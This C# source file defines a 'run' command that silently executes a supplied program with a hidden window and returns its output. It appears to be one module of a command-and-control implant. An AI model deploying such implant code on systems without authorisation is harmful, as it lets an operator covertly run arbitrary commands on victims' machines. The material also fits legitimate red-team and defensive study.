using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Run : EngineerCommand
    {
        public override string Name => "run";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                task.Arguments.TryGetValue("/command", out string command);
                task.Arguments.TryGetValue("/args", out string argument);

                var output = new StringBuilder();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = command,
                        Arguments = argument,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };

                process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
                process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();

                process.Dispose();

                Tasking.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete);
            }
            catch (Exception ex)
            {
                Tasking.FillTaskResults(ex.Message, task, EngTaskStatus.Failed);
            }
        }
    }
}
